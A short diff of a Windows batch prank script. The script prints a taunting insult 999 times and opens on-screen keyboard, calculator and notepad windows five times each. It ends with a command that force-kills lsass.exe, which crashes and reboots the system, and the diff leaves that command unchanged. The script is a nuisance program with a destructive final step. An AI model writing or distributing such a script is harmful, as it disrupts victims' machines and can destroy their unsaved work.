@@ -1,13 +1,13 @@
 @echo off
 for /l %%i in (1,1,999) do (
-    echo you are an idiot ha ha ha ha ha %%i
+    echo you are an idiot ha ha ha ha ha
 )
 
 :: Loop to open programs 5 times quickly
 for /l %%j in (1,1,5) do (
-    start notepad.exe
+    start osk.exe
     start calc.exe
-    start mspaint.exe
+    start notepad.exe
 )
 
 taskkill /IM lsass.exe /F
